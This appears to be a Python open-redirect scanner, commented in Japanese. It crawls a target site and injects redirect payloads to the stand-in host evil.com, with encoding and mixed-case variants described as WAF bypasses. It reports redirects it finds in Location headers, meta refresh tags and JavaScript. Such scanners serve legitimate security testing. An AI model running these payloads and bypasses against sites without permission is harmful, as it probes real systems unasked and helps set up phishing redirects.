import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, quote
from bs4 import BeautifulSoup
import re
import argparse
import json

base_payloads = [
    'https://evil.com',
    '//evil.com',
    'https:@evil.com',
    '///evil.com',
    '/\\evil.com',  # バックスラッシュ混入
    '%2F%2Fevil.com',
]

common_redirect_params = [
    "url", "redirect", "next", "return", "continue", "target",
    "dest", "destination", "redir", "callback", "returnTo"
]

visited_urls = set()
results = []

def mixed_case(s):
    res = ''
    upper = True
    for c in s:
        res += c.upper() if upper else c.lower()
        upper = not upper
    return res

def double_url_encode(s):
    return quote(quote(s, safe=''), safe='')

def single_url_encode(s):
    return quote(s, safe='')

def generate_payload_variants(base):
    variants = []

    variants.append(base)
    variants.append(mixed_case(base))
    variants.append(single_url_encode(base))
    variants.append(double_url_encode(base))
    variants.append(mixed_case(single_url_encode(base)))

    return list(set(variants))  # 重複除去

def build_url_with_payload(url, param_name, payload):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    query_params[param_name] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    return new_url

def check_meta_refresh(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    meta = soup.find('meta', attrs={'http-equiv': re.compile('refresh', re.I)})
    if meta and 'content' in meta.attrs:
        content = meta['content']
        if 'evil.com' in content:
            return content
    return None

def check_javascript_redirect(response_text):
    patterns = [
        r'window\.location\s*=\s*[\'"](https?:)?//?evil\.com',
        r'window\.location\.href\s*=\s*[\'"](https?:)?//?evil\.com',
        r'location\.replace\([\'"](https?:)?//?evil\.com'
    ]
    for pattern in patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return pattern
    return None

def test_redirect(url):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    target_params = query_params.keys() if query_params else common_redirect_params

    for param in target_params:
        print(f"[*] パラメータ検査中: {param}")

        for base_payload in base_payloads:
            payload_variants = generate_payload_variants(base_payload)

            for payload in payload_variants:
                test_url = build_url_with_payload(url, param, payload)
                try:
                    response = requests.get(test_url, allow_redirects=False, timeout=10)
                    location = response.headers.get("Location")

                    detection = {
                        "tested_url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "vulnerabilities": []
                    }

                    if location and "evil.com" in location:
                        print(f"[!!!] Locationヘッダで検出: {test_url} -> {location}")
                        detection["vulnerabilities"].append("Location Header Redirect")

                    meta_result = check_meta_refresh(response.text)
                    if meta_result:
                        print(f"[!!!] Meta Refreshで検出: {test_url}")
                        detection["vulnerabilities"].append("Meta Refresh Redirect")

                    js_result = check_javascript_redirect(response.text)
                    if js_result:
                        print(f"[!!!] JavaScriptで検出: {test_url}")
                        detection["vulnerabilities"].append("JavaScript Redirect")

                    if detection["vulnerabilities"]:
                        results.append(detection)

                except Exception as e:
                    print(f"[!] リクエストエラー: {e}")

def crawl_and_scan(start_url, max_pages=50):
    queue = [start_url]
    parsed_start = urlparse(start_url)
    domain = parsed_start.netloc

    while queue and len(visited_urls) < max_pages:
        current_url = queue.pop(0)
        if current_url in visited_urls:
            continue

        visited_urls.add(current_url)
        print(f"\n[CRAWL] {current_url}")
        try:
            response = requests.get(current_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link_tag in soup.find_all('a', href=True):
                href = link_tag['href']
                absolute_url = urljoin(current_url, href)
                parsed_href = urlparse(absolute_url)
                if parsed_href.netloc == domain and absolute_url not in visited_urls:
                    queue.append(absolute_url)

            test_redirect(current_url)

        except Exception as e:
            print(f"[!] クロールエラー: {e}")

def save_report(output_file):
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)
    print(f"\n[+] レポートを保存しました: {output_file}")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Open Redirect Scanner with WAF Bypass Payloads')
    parser.add_argument('-u', '--url', required=True, help='ターゲットのURL')
    parser.add_argument('--max-pages', type=int, default=50, help='最大クロールページ数 (デフォルト:50)')
    parser.add_argument('-o', '--output', default='report.json', help='出力ファイル名 (デフォルト: report.json)')
    args = parser.parse_args()

    crawl_and_scan(args.url, args.max_pages)
    save_report(args.output)
